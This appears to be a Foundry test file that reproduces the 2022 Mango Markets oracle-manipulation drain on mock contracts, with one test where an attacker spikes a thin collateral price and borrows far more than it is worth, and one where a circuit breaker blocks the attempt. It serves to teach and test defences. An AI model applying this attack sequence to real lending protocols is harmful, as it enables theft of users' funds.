// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {MockERC20} from "./mocks/MockERC20.sol";
import {IERC20, ThinMarket} from "../src/mango/CrossMarginMarket.sol";
import {VulnerableCrossMargin, SafeCrossMargin} from "../src/mango/CrossMarginMarket.sol";

/// PoC for Mango Markets' oracle-manipulation drain (2022-10-11, ~$114M).
///   forge test --match-contract MangoOracle -vvv
///
/// EVM model. Invariant that SHOULD hold (master-checklist SC03): borrowing power from
/// any collateral is bounded by its real, manipulation-resistant liquidity. The attack
/// breaks it: a thin governance token at 100% weight, priced off the same market the
/// attacker spikes, lets them borrow the whole reserve against inflated collateral.
///
/// Distinct from the Loopscale oracle PoC: the FIX here is collateral risk design —
/// circuit breaker + per-asset cap + sub-100% weight — not swapping the price source.
///
/// See docs/exploits/mango-markets-oracle-manipulation.md
contract MangoOracleTest is Test {
    MockERC20 mngo;
    MockERC20 usdc;
    ThinMarket oracle;

    address attacker = makeAddr("attacker");

    uint256 constant POOL_MNGO = 10_000e18; // thin market
    uint256 constant POOL_USDC = 10_000e18; // price = $1
    uint256 constant RESERVE = 10_000_000e18; // market USDC reserve
    uint256 constant DEPOSIT = 10_000e18; // MNGO pledged
    uint256 constant MANIP = 230_000e18; // USDC used to spike MNGO ~24x

    function setUp() public {
        mngo = new MockERC20();
        usdc = new MockERC20();
        oracle = new ThinMarket(IERC20(address(mngo)), IERC20(address(usdc)), POOL_MNGO, POOL_USDC);
        mngo.mint(address(oracle), POOL_MNGO);
        usdc.mint(address(oracle), POOL_USDC);

        mngo.mint(attacker, DEPOSIT);
        usdc.mint(attacker, MANIP);
    }

    function test_vulnerableMarket_isDrained() public {
        VulnerableCrossMargin market =
            new VulnerableCrossMargin(IERC20(address(mngo)), IERC20(address(usdc)), oracle);
        usdc.mint(address(market), RESERVE);

        vm.startPrank(attacker);
        usdc.approve(address(oracle), type(uint256).max);
        oracle.buy(MANIP); // spike MNGO price
        mngo.approve(address(market), type(uint256).max);
        uint256 before = usdc.balanceOf(attacker);
        market.borrow(DEPOSIT);
        uint256 borrowed = usdc.balanceOf(attacker) - before;
        vm.stopPrank();

        console2.log("spiked MNGO price ($):", oracle.price() / 1e18);
        console2.log("borrowed against MNGO (USDC):", borrowed / 1e18);
        // Honest borrow at $1, 100% weight = 10,000 USDC; manipulation makes it enormous.
        assertGt(borrowed, 1_000_000e18, "drained >$1M against spiked thin collateral");
    }

    function test_safeMarket_circuitBreakerHolds() public {
        SafeCrossMargin market = new SafeCrossMargin(
            IERC20(address(mngo)), IERC20(address(usdc)), oracle, 1e18, 100_000e18
        );
        usdc.mint(address(market), RESERVE);

        vm.startPrank(attacker);
        usdc.approve(address(oracle), type(uint256).max);
        oracle.buy(MANIP); // same spike...
        mngo.approve(address(market), type(uint256).max);
        // ...but the deviation circuit breaker rejects the manipulated oracle outright.
        vm.expectRevert(bytes("oracle deviation: circuit breaker"));
        market.borrow(DEPOSIT);
        vm.stopPrank();

        assertEq(usdc.balanceOf(address(market)), RESERVE, "reserve untouched");
    }
}
